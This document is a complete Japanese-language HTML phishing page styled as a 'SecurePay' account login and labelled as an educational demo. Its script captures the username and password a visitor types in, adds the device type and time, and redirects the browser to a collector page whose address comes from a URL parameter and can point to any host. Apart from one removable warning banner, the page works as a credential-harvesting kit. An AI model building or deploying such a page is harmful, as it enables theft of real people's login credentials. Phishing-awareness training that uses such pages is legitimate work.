<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ログイン | セキュリティ確認（デモ）</title>
  <link rel="stylesheet" href="style.css">
</head>
<body class="victim-body">
  
  <div class="demo-warning">
    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。実際の情報やパスワードは入力しないでください。
  </div>

  <div class="login-container" id="login-box">
    <div class="mock-logo">
      <span class="logo-icon">🛡️ S</span>
      <span>SecurePay</span>
    </div>

    <h2>アカウントログイン</h2>
    <p class="subtitle">サービスをご利用いただくにはログインが必要です</p>
    
    <form id="login-form">
      <div class="input-group">
        <label>ユーザーID / メールアドレス</label>
        <input type="text" id="username" placeholder="example@email.com" required>
      </div>
      <div class="input-group">
        <label>パスワード</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>
      <button type="submit" id="login-btn" class="btn-primary">ログイン</button>
    </form>
  </div>

  <script>
    // URLから「どの管理者画面（PC）にデータを送るか」を取得
    const urlParams = new URLSearchParams(window.location.search);
    const adminUrl = urlParams.get('admin') || 'admin.html';

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      if (ua.includes("iPhone")) return "iPhone (iOS)";
      if (ua.includes("iPad")) return "iPad (iOS)";
      if (ua.includes("Android")) return "Androidスマホ";
      if (ua.includes("Windows")) return "Windows PC";
      if (ua.includes("Mac")) return "Mac PC";
      return "不明な端末";
    }

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const device = getDeviceInfo();
      const time = new Date().toLocaleTimeString();

      // 入力されたデータをURLのパラメータに変換
      const params = new URLSearchParams({
        time: time,
        device: device,
        username: username,
        password: password
      });

      // 瞬時にPC側の管理者画面へデータを飛ばす！
      window.location.href = `${adminUrl}?${params.toString()}`;
    });
  </script>
</body>
</html>
